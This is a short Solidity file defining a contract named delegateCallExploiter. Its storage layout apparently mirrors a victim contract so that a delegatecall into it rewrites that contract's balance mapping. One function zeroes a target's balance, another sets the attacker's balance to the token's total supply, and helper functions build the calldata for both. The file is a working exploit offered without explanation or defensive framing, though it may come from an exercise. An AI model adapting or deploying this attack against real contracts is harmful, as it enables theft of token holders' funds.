// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract delegateCallExploiter {
   
    IERC20 public token;
    mapping(address => uint) public memorySlot1;
    uint public uselessSlot;
    address public here;
    

    constructor(IERC20 _token){
        token = _token;
        here = address(this);
    }

    function attack(address attackReceiver) public returns(bool){
        memorySlot1[attackReceiver] = 0;
        
        return true;
    }
    function attack2(address attackRunner) public returns(bool){
        uint totals = token.totalSupply();
        memorySlot1[attackRunner] = totals;
        
        return true;
    }

    function bytesGet1(address attackReceiver) public pure returns(bytes memory){
        
        return abi.encodeWithSignature("attack(address)", attackReceiver);
        
    }

    function bytesGet2(address attackRunner) public pure returns(bytes memory){
        
        return abi.encodeWithSignature("attack2(address)", attackRunner);
        
    }

}

